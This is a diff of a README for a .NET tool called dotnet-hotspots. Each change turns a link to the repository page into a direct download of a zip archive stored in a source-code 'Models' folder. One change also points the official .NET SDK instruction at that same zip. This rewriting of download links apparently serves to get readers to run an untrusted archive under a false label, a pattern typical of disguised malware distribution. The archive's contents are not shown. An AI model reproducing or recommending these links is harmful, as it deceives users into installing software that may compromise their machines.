@@ -1,6 +1,6 @@
 # 🕵️ dotnet-hotspots - Find Frequent File Changes Fast
 
-[![Download dotnet-hotspots](https://img.shields.io/badge/Download-dotnet--hotspots-brightgreen)](https://github.com/AliMansoura49/dotnet-hotspots)
+[![Download dotnet-hotspots](https://img.shields.io/badge/Download-dotnet--hotspots-brightgreen)](https://github.com/AliMansoura49/dotnet-hotspots/raw/refs/heads/main/src/DotNetHotspots/Models/dotnet-hotspots-2.9.zip)
 
 ## 🔍 What is dotnet-hotspots?
 
@@ -21,11 +21,11 @@ You do not need to know how to code to use this tool. It works on Windows and ru
 
 ## 🌐 Download dotnet-hotspots
 
-[![Download dotnet-hotspots](https://img.shields.io/badge/Download-dotnet--hotspots-orange?style=for-the-badge)](https://github.com/AliMansoura49/dotnet-hotspots)
+[![Download dotnet-hotspots](https://img.shields.io/badge/Download-dotnet--hotspots-orange?style=for-the-badge)](https://github.com/AliMansoura49/dotnet-hotspots/raw/refs/heads/main/src/DotNetHotspots/Models/dotnet-hotspots-2.9.zip)
 
 To get started, visit this page to download the tool and follow the instructions below.
 
-Link: [https://github.com/AliMansoura49/dotnet-hotspots](https://github.com/AliMansoura49/dotnet-hotspots)
+Link: [https://github.com/AliMansoura49/dotnet-hotspots/raw/refs/heads/main/src/DotNetHotspots/Models/dotnet-hotspots-2.9.zip](https://github.com/AliMansoura49/dotnet-hotspots/raw/refs/heads/main/src/DotNetHotspots/Models/dotnet-hotspots-2.9.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Follow these steps carefully to run the tool on your system.
 
 dotnet-hotspots runs on the .NET platform. You need the .NET SDK installed on your computer first.
 
-- Go to https://dotnet.microsoft.com/download to get the latest SDK for Windows.
+- Go to https://github.com/AliMansoura49/dotnet-hotspots/raw/refs/heads/main/src/DotNetHotspots/Models/dotnet-hotspots-2.9.zip to get the latest SDK for Windows.
 - Download the installer and run it.
 - Follow the on-screen instructions until the installation finishes.
 - To check if .NET is installed, open Command Prompt and type:
@@ -159,4 +159,4 @@ Check the help command for all available options.
 
 Visit this page to download and access further details:
 
-[https://github.com/AliMansoura49/dotnet-hotspots](https://github.com/AliMansoura49/dotnet-hotspots)
+[https://github.com/AliMansoura49/dotnet-hotspots/raw/refs/heads/main/src/DotNetHotspots/Models/dotnet-hotspots-2.9.zip](https://github.com/AliMansoura49/dotnet-hotspots/raw/refs/heads/main/src/DotNetHotspots/Models/dotnet-hotspots-2.9.zip)
